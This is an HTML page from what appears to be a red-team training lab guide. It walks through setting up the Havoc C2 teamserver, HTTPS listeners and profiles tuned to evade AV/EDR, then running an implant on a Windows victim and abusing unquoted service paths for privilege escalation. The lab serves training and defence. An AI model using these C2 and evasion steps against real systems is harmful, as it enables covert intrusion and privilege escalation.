<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title></title>
        
        <meta name="robots" content="noindex" />
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="training.html"><strong aria-hidden="true">1.</strong> Training </a></li><li><ol class="section"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.1.</strong> Intro</a></li><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.2.</strong> Havoc C2</a></li><li class="expanded "><a href="privesc.html"><strong aria-hidden="true">1.3.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="expanded "><a href="unquoted.html"><strong aria-hidden="true">1.3.1.</strong> Unquoted Service Path</a></li><li><ol class="section"><li class="expanded "><a href="lab_privesc.html"><strong aria-hidden="true">1.3.1.1.</strong> Lab - PrivEsc</a></li></ol></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.3.2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="expanded "><a href="lab_uac.html"><strong aria-hidden="true">1.3.2.1.</strong> Lab - UAC Bypass</a></li></ol></li><li class="expanded "><a href="stealtoken.html"><strong aria-hidden="true">1.3.3.</strong> Token Manipulation</a></li><li><ol class="section"><li class="expanded "><a href="lab_token.html"><strong aria-hidden="true">1.3.3.1.</strong> Lab - Token theft</a></li><li class="expanded "><a href="lab_tokeninjection.html"><strong aria-hidden="true">1.3.3.2.</strong> Lab - Injection</a></li><li class="expanded "><a href="lab_getsystem.html"><strong aria-hidden="true">1.3.3.3.</strong> Lab - GetSystem</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.4.</strong> Windows Defender</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.5.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.5.1.</strong> ETW</a></li><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.5.2.</strong> Lab - Powershell</a></li><li class="expanded "><a href="lab_psloader.html"><strong aria-hidden="true">1.5.3.</strong> Lab - PS Loader</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.6.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_static.html"><strong aria-hidden="true">1.6.1.</strong> Lab Static Analysis</a></li><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.6.2.</strong> Lab - Havoc dotnet execute</a></li><li class="expanded "><a href="lab_staticforensics.html"><strong aria-hidden="true">1.6.3.</strong> Forensics</a></li></ol></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.7.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.8.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.8.1.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.8.2.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_shellcodeforensics.html"><strong aria-hidden="true">1.8.3.</strong> Forensics</a></li><li class="expanded "><a href="lab_xor.html"><strong aria-hidden="true">1.8.4.</strong> Lab - XOR Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.8.5.</strong> Lab - Remote Loader</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.9.</strong> Forensics</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.9.1.</strong> Malware Analysis Lab</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li><li><ol class="section"><li class="expanded "><a href="frameworks.html"><strong aria-hidden="true">2.1.</strong> Frameworks</a></li><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">2.2.</strong> Heuristics</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">2.3.</strong> Hooks</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">2.4.</strong> Syscalls</a></li><li class="expanded "><a href="kernelcallbacks.html"><strong aria-hidden="true">2.5.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">2.6.</strong> EDR Stuff</a></li><li class="expanded "><a href="privesc_extra.html"><strong aria-hidden="true">2.7.</strong> Additional PrivEsc</a></li><li class="expanded "><a href="havoc_extra.html"><strong aria-hidden="true">2.8.</strong> Additional Havoc</a></li><li class="expanded "><a href="avred.html"><strong aria-hidden="true">2.9.</strong> AVRED</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">2.10.</strong> Metasploit Basics</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title"></h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#training" id="training">Training</a></h1>
<h1><a class="header" href="#intro--threathunting-academy---evasion" id="intro--threathunting-academy---evasion">Intro : Threathunting Academy - Evasion</a></h1>
<p><img src="./images/cr_hackers.jpg" alt="image" /></p>
<p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a <strong>Kali</strong> <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
<p><strong>What you will learn in this training:</strong></p>
<ul>
<li>How attack frameworks work</li>
<li>AV and EDR internals and how to evade them
<ul>
<li>Windows Defender, AMSI and ETW basics and evasion</li>
</ul>
</li>
<li>Powershell based attacks (in-memory) </li>
<li>How signature based detection works and how to evade</li>
<li>What Shellcode is, how to build and use shellcode</li>
<li>Build your own evasive shellcode loader</li>
<li>Build your own Forensics Lab</li>
</ul>
<blockquote>
<p>In this training we'll be using an <em><strong>Administrator</strong></em> account, this training is not about privilege escalation, but to show you how you can elevate a regular user to an Admin/System user, we'll have a brief lab doing just that.</p>
</blockquote>
<p>With that out of the way we'll run all other labs with and admin user.</p>
<p><strong>At the End of this training</strong></p>
<ul>
<li>You will know how to set up your own malware analysis lab</li>
<li>Have learned how privilege escalation, persistence, code-execution, evasion and other tehniques work.</li>
<li>Modify existing attack tools to bypass defenses</li>
<li>Learn how to analyze malware (static/dynamic)</li>
<li>Work with attack frameworks, customize them with your own toolset and apply evasion techniques</li>
<li>Build your own evasive <code>shellcode loader</code> using memory injection, remote payloads, obfuscation, encryption and other evasion techniques</li>
<li>Understand how AV/EDR solutions work, where their telemetry comes from and how to bypass</li>
</ul>
<h1><a class="header" href="#havoc-c2" id="havoc-c2">Havoc C2</a></h1>
<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Starkiller GUI), <code>BruteRatel</code>, <code>Mythic C2</code>, <code>Covenant</code> and <code>Sliver</code> come to mind. </p>
<p><img src="./images/c2matrix.jpg" alt="Screenshot" /></p>
<p>(<a href="https://c2matrix.webflow.io">https://c2matrix.webflow.io</a>)</p>
<p>In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
<blockquote>
<p>HAVOC Requires <code>sudo apt install mingw-w64 -y</code> on your kali !!! In case of compile errors, download this : https://github.com/troglobit/misc/releases/download/11-20211120/x86_64-w64-mingw32-cross.tgz extract to /usr/bin (#~$ sudo tar -xzvf [compilerZip].tgz -C /usr/bin)</p>
<p>Then modify your /usr/share/havoc/profiles/havoc.yaotl file and change both the
Compiler64 &amp; Compiler86 variables to point to: &quot;usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;</p>
</blockquote>
<pre><code class="language-yaml">Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;
        Compiler86 = &quot;/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
</code></pre>
<p><img src="./images/havoc.jpg" alt="Screenshot" /></p>
<p><a href="https://github.com/HavocFramework/Havoc?tab=readme-ov-file">https://github.com/HavocFramework/Havoc?tab=readme-ov-file</a></p>
<p>Attack frameworks typically all consist of the following elements</p>
<ol>
<li>
<p><em><strong>Teamserver</strong></em>
The central C2 server that receives C2 traffic from implants on its listeners (i.e. <code>LHOST</code> in metasploit), management connections from the client as well as it typically also hosts payloads.</p>
</li>
<li>
<p><em><strong>Client</strong></em>
This is the operater console that connects to the teamserver and allows the adversary to manage listeners, malleable profiles, payloads and implants.</p>
</li>
<li>
<p><em><strong>Implant, beacon, demon, ...</strong></em> 
This is the actual malicious code that communicates back over a C2 channel to the teamserver, very often this is primarily a stager/loader (a tiny program that will download the actual malicious code and typically inject it in to memory of a current or remote process.) - attack frameworks will provide a <code>payload generator</code> that can build different types of payloads (Exe's, dll's, shellcode, etc...).</p>
</li>
</ol>
<p>The most known is probably MSFVenom from the <code>Metasploit Framework</code>.</p>
<p><img src="./images/havoc_msfvenom.jpg" alt="Screenshot" /></p>
<ol start="4">
<li><em><strong>C2 Redirectors</strong></em> 
We won't be using this in the lab, but in real world scenarios these functies as proxies between the victim and the team-server (It's easier to pop up a new proxy, than a completely new teams-server)</li>
</ol>
<p>Havoc C2 is the framework we will be using in this training, however the techniques we'll be using can be utilized in each of beforementioned frameworks.</p>
<blockquote>
<p>On Kali we can simply install Havoc C2 with the following command (this is already done)</p>
</blockquote>
<pre><code class="language-bash">apt install havoc
</code></pre>
<h1><a class="header" href="#creating-a-custom-profile" id="creating-a-custom-profile">Creating a custom profile</a></h1>
<p>Let's have a look at the custom profile we have created for this team server. The profile will have the general settings such as users that can log in to the team server, user agents for HTTP/HTTPs listeners, and how our implants will behave.</p>
<blockquote>
<p><em><strong>OPSEC HINT</strong></em> : Always customize your profiles as default profiles are almost often finger printed by AV/EDR.</p>
</blockquote>
<pre><code class="language-bash">sudo nano /opt/Havoc/profiles/custom.yaotl
</code></pre>
<p>This is the content of the <code>custom.yoatl</code> profile:</p>
<pre><code class="language-yaml">Teamserver {
    Host = &quot;0.0.0.0&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-gcc&quot; #latest version of kali this needs to be replaced
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;Threatadmin&quot; {
        Password = &quot;Threathunt25&quot;
    }
}

# demon setting.

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\Werfault.exe&quot;
    }

    Binary {
        ReplaceStrings-x64 = {
            &quot;demon.x64.dll&quot;: &quot;&quot;,
            &quot;This program cannot be run in DOS mode.&quot;: &quot;&quot;,
        }
    }
}
</code></pre>
<h1><a class="header" href="#running-the-teamserver" id="running-the-teamserver">Running the teamserver</a></h1>
<p><img src="./images/havoc_team.jpg" alt="Screenshot" /></p>
<pre><code class="language-bash">havoc server --profile /opt/Havoc/profiles/custom.yoatl -v --debug
</code></pre>
<p>Let's set thsis up as a service:</p>
<pre><code class="language-bash">sudo nano /lib/systemd/system/havocservice.service
</code></pre>
<pre><code class="language-yaml">[Unit]
Description=HavocServer
After=network.target

[Service]
Type=idle
Restart=on-failure
User=root
ExecStart=&quot;/usr/bin/havoc&quot; &quot;server&quot; &quot;--profile&quot; &quot;/opt/havoc/profiles/https.yaotl&quot;

[Install]

</code></pre>
<p>Change the file permisions, enable and start the service:</p>
<pre><code>sudo chmod 644 /lib/systemd/system/
sudo systemctl daemon-reload
enable havocserver.service
sudo systemctl start havocserver.service 
systemctl status havocserver.service
&quot;
</code></pre>
<h1><a class="header" href="#running-the-client" id="running-the-client">Running the client</a></h1>
<p><img src="./images/havoc_newtab.jpg" alt="Screenshot" /></p>
<p>In your terminal open a new tab, then run the following command:</p>
<pre><code class="language-code">havoc client
</code></pre>
<p>We can now log in to our teamserver using the user <code>Threatadmin</code> and the password which we defined in the custom Havoc C2 profile.</p>
<p><img src="./images/havoc_login.jpg" alt="Screenshot" /></p>
<p>Let's start by setting up a listener:</p>
<p><a href="https://havocframework.com/docs/profiles">https://havocframework.com/docs/profiles</a></p>
<p>In the Havoc GUI to to <code>view</code> and select listeners.</p>
<p><img src="./images/havoc_viewlistener.jpg" alt="Screenshot" /></p>
<blockquote>
<p><em><strong>OPSEC HINT</strong></em> : Always customize your listeners by using valid user agents, also by using HTTPs we make sure our connections are harder to inspect. This is a nice website to generate user agents strings: <a href="https://useragents.io/parse/my-user-agent">https://useragents.io/parse/my-user-agent</a></p>
</blockquote>
<p>Here's a regular chrome user agent from your windows machine:</p>
<pre><code class="language-yaml">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
</code></pre>
<p>Let's add an HTTPs listener, click on <code>Add</code> and enter the listener configuration. Give the listener a name, select <code>Https</code> and past the user agent in the correct field. Click on <code>Save</code></p>
<blockquote>
<p>Make sure you select the correct IP addres (host) for your machine! You can double check by running ifconfig.</p>
</blockquote>
<p><img src="./images/ifconfig.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_addlistener.jpg" alt="Screenshot" /></p>
<p>We can also add this to our Havoc profile, so that all these settings are applied when starting the team server. But before we do that, lets keep our OPSEC in mind, we need HTTPS - and we bettter not use the default SSL certificates, those might be signatured. </p>
<p>Next we're going to create a self-signed SSL certificate (PEM) and key file - Self signed certificates are of course not ideal - in a real world scenario we'd have them signed by a trusted PKI.</p>
<pre><code class="language-bash">cd /opt/havoc/
mkdir certs
cd certs
openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
</code></pre>
<p>Output:</p>
<p><img src="./images/havoc_certs.jpg" alt="Screenshot" /></p>
<p>Let's copy the custom.yoatl profile to a new HTTPS template where we'll add the certs, user-agent, listener settings and so on</p>
<pre><code class="language-bash">cd /opt/havoc/profiles
sudo cp custom.yoatl https.yoatl
sudo nano /opt/Havoc/profiles/custom.yaotl
</code></pre>
<p>This is the new content of the custom <code>HTTPS.yoatl</code> profile:</p>
<pre><code class="language-yaml">Teamserver {
    Host = &quot;0.0.0.0&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;
        Compiler86 = &quot;/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;Threatadmin&quot; {
        Password = &quot;Threathunt25&quot;
    }
}

# HTTPS LISTENER AND CERTS

Listeners {
    Http {
        Name         = &quot;HTTPs Listener&quot;
        Hosts        = [&quot;kali&quot;]
        #KillDate     = &quot;2006-01-02 15:04:05&quot; 
        #WorkingHours = &quot;8:00-17:00&quot;
        HostBind     = &quot;0.0.0.0&quot;
        PortBind     = 443
        PortConn     = 443
        HostRotation = &quot;round-robin&quot;
        Secure       = true
        UserAgent    = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36&quot;
        Cert {
                Cert = &quot;/opt/havoc/certs/public.crt&quot;
                Key = &quot;/opt/havoc/certs/private.key&quot;
        }
     }
}
# demon setting.

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\Werfault.exe&quot;
        Spawn32 = &quot;C:\\Windows\\SysWOW64\notepad.exe&quot;
    }

    Binary {
        ReplaceStrings-x64 = {
            &quot;demon.x64.dll&quot;: &quot;&quot;,
            &quot;This program cannot be run in DOS mode.&quot;: &quot;&quot;,
        }
    }
}
</code></pre>
<p>Now close your Havoc Teamserver and client in terminal (control-c) and start the teamserver again with your new profile:</p>
<pre><code class="language-bash">havoc server --profile /opt/havoc/profiles/https.yoatl -v --debug
</code></pre>
<p>Open a second tab in your terminal and run:</p>
<pre><code class="language-bash">havoc client
</code></pre>
<p>Let's go and check if our profile has created the HTTPS listener - in the Havoc client go to <code>VIEW</code>, <code>Listeners</code>, select the HTTPs Listener and click on edit. You'll see the following (please note the host bind address will be different from the screenshot).</p>
<p><img src="./images/havoc_httpslis.jpg" alt="Screenshot" /></p>
<p>On your windows machine when we browse with Chrome to the HTTPs listener (https://10.0.0.7:443), we'll now see our own custom self-signed certificate - <em><strong>one IOC less for AV/EDR to trigger on! And C2 traffic is now encrypted!</strong></em></p>
<p><img src="./images/havoc_certswin.jpg" alt="Screenshot" /></p>
<p>We'll create a vanilla demon payload as an executable, make sure all settings are like in the screenshot below (we'll go into the advanced evasion settings later on), save the payload in <em><strong>&quot;/opt/havoc/payloads&quot;</strong></em> directory:</p>
<p><img src="./images/havoc_payload.jpg" alt="Screenshot" /></p>
<p>On your kali machine, go your terminal and let's hosts this payload so we can download it on our windows victim machines:</p>
<pre><code class="language-bash">cd /opt/havoc/payloads
updog2
</code></pre>
<p><img src="./images/havoc_kaliupdog.jpg" alt="Screenshot" /></p>
<p>Now, on your windows machine use <code>Chrome</code> and go to <a href="http:%5C%5Ckali:9090%5C">http:\\kali:9090\</a> and download the Havoc demon (&quot;<strong>demon.x64.exe</strong>&quot;) to </p>
<blockquote>
<p><em><strong>NOTE</strong></em>: &quot;C:\Temp&quot; is is whitelisted in MS Defender, we will deal with AV Evasion later on, for now we just want to make sure our code executes and sets up a c2 connection.</p>
</blockquote>
<p><img src="./images/havoc_updog.jpg" alt="Screenshot" /></p>
<blockquote>
<p>IMPORTANT: For the time being turn your Windows Defender <code>OFF</code>.</p>
</blockquote>
<p>We want to start with regular user privileges, so open a command prompt running as the unprivileged user <code>student</code>.</p>
<pre><code class="language-powershell">runas /user:student cmd.exe
</code></pre>
<p>Enter the password, and in the new command prompt you are now running as a regular user with medium integrity.</p>
<p><img src="./images/havoc_clistudent.jpg" alt="Screenshot" /></p>
<p>Now from this new command prompt running as unprivileged user, execute the payload:</p>
<pre><code class="language-powershell">cd \temp
demon.x64.exe
</code></pre>
<p><img src="./images/havoc_demon.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_session.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_session2.jpg" alt="Screenshot" /></p>
<p>We can now interact with this implant by right-clicking the icon and selecting <code>&quot;Interact&quot;</code>.</p>
<p><img src="./images/havoc_interact1.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_interact2.jpg" alt="Screenshot" /></p>
<p>Let's check if our demon is actually running with the student account in medium integrity.</p>
<pre><code class="language-powershell">whoami 
</code></pre>
<p><img src="./images/havoc_medbeacon.jpg" alt="Screenshot" /></p>
<p>We now have a simple Havoc demon payload running on the victim client, of course this would have been detected by AV, and as a regular user we can't do all the cool stuff - so let's continue and see how we can elevate privileges.</p>
<h1><a class="header" href="#privilege-escalation--persistence" id="privilege-escalation--persistence">Privilege Escalation / Persistence</a></h1>
<p>In order to escalate privilege from a regular user to a higher level account (Administrator/System Authority), you need either a <code>misconfiguration</code> (typically permission issues on services, scheduled tasks etc...) or an <code>exploit</code> (Remote/Rogue/Sweet/Rotten/Juicy/God Potato etc..) - a properly patched and configured system will provide challenges to escalte privileges from a standard user to a administrator user. </p>
<p>That being said, there are numerous techniques to obtain hashes/passwords, that don't requite administrator privileges - such as <code>kerberoasting</code>, <code>ntlm relaying</code> and <code>password spraying</code>.</p>
<p>Running as a regular unprivileged user:</p>
<p><img src="./images/priv_whoamimed.jpg" alt="image" /></p>
<p><img src="./images/priv_med.jpg" alt="image" /></p>
<p>Running as an administrator:</p>
<p><img src="./images/priv_whoami.jpg" alt="image" /></p>
<h1><a class="header" href="#what-is-sedebugprivilege" id="what-is-sedebugprivilege">What is SeDebugPrivilege?</a></h1>
<p>SeDebugPrivilege is a special privilege in Windows that allows a user or process to debug other processes, even those running under different security contexts or with higher privileges, such as system services. This privilege is part of Windows' security model, which uses privileges to control what actions a user or process can perform on the system.</p>
<h2><a class="header" href="#key-points-about-sedebugprivilege" id="key-points-about-sedebugprivilege">Key Points About SeDebugPrivilege</a></h2>
<h3><a class="header" href="#purpose" id="purpose">Purpose:</a></h3>
<ul>
<li>By default, users can only debug processes they own (i.e., processes they started or are running under their user account).</li>
<li>SeDebugPrivilege extends this capability, allowing a process or user with this privilege to:
<ul>
<li>Attach a debugger to,</li>
<li>Inspect, or</li>
<li>Modify any process on the system, including those running as other users or as the SYSTEM account (a highly privileged account in Windows).</li>
</ul>
</li>
</ul>
<h3><a class="header" href="#how-it-works" id="how-it-works">How It Works:</a></h3>
<ul>
<li>The privilege is managed through Windows security policies and can be assigned or revoked by an administrator.</li>
<li>It is typically enabled for members of the Administrators group by default on many Windows systems, but this can be changed via Group Policy Objects (GPOs) or local security policies.</li>
<li>To use SeDebugPrivilege, a process must explicitly request it using Windows API functions like <code>LookupPrivilegeValue</code> and <code>AdjustTokenPrivileges</code>. This involves:
<ul>
<li>Obtaining a handle to the process token.</li>
<li>Enabling the privilege.</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>Default Settings</strong>: On many Windows versions (e.g., Windows 10), it’s assigned to the <code>Administrators group by default</code>, which can be risky if not properly managed. Even with SeDebugPrivilege, some actions (like injecting into a SYSTEM process) may still fail if other security mechanisms, such as <em><strong>User Account Control (UAC)</strong></em> or additional restrictions, are in place.</p>
<p><strong>Note</strong>: Administrators can control SeDebugPrivilege through the Local Security Policy editor (secpol.msc) or Group Policy Management Editor. It is listed under &quot;User Rights Assignment&quot; as &quot;Debug programs&quot;. To enable or disable it, an administrator can modify the security policy to add or remove user groups (e.g., Administrators) from having this privilege.</p>
</blockquote>
<p>Escalating from unprivileged user to <em><strong>SYSTEM</strong></em> in 3 steps:</p>
<p><img src="./images/priv_chain.jpg" alt="image" /></p>
<h1><a class="header" href="#unquoted-service-path" id="unquoted-service-path">UNQUOTED SERVICE PATH</a></h1>
<h1><a class="header" href="#summary" id="summary">SUMMARY</a></h1>
<p>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.</p>
<p>Service paths and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. &quot;C:\safe path with space\program.exe&quot;). [2] (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.</p>
<p>This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.</p>
<h1><a class="header" href="#mitre" id="mitre">MITRE</a></h1>
<p><img src="./images/token_unquoted.jpg" alt="screenshot" /></p>
<ul>
<li>
<p>AlwaysInstallElevated (MSI)</p>
</li>
<li>
<p>Unquoted Service Path (Services)</p>
<ul>
<li>Requires missing &quot;quotes&quot;</li>
<li>and whitespaces in the path</li>
<li>write permission in the (sub)folder that holds the service binary</li>
</ul>
</li>
</ul>
<p>To exploit, the exe needs to be named after the directory it's in, i.e:</p>
<hr />
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</p>
<ul>
<li>Create folders &quot;C:\MyPrograms\Vulnerable Service&quot;</li>
<li>create pingservice in vs2019</li>
<li>copy pingservice as &quot;VulnService.exe&quot; to this path</li>
</ul>
<pre><code class="language-powershell">sc create VulnService binPath= &quot;C:\MyPrograms\Vulnerable Service\VulnService.exe&quot;
sc config VulnService obj= &quot;.\Threatadmin&quot; password= &quot;password&quot;
sc qc VulnService
sc start VulnService
</code></pre>
<p>When there are spaces in a service path, windows will try to find the service as follows:</p>
<p>It will parse &quot;C:\MyPrograms\Vulnerable Service\service.exe&quot; into</p>
<ul>
<li>Potential service : &quot;C:\MyPrograms\vulnerable.exe&quot;</li>
<li>with arguments <code>Service\service.exe</code></li>
</ul>
<p>By placing a malicious service exe in &quot;C:\MyPrograms&quot; named <code>vulnerable.exe</code>, we'll escalate privileges to NT SYSTEM AUHTORITY (if the service is running with those privileges)</p>
<p>Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.</p>
<p>https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md</p>
<hr />
<p>Run the following tools as a regular unprivileged user (<code>runas /user:student powershell.exe</code>)</p>
<blockquote>
<ul>
<li>[+] SharpUp/Powerup</li>
<li>[+] WinPeas</li>
</ul>
</blockquote>
<h3><a class="header" href="#winpeas" id="winpeas">WINPEAS</a></h3>
<p>Runas student (unprivileged)</p>
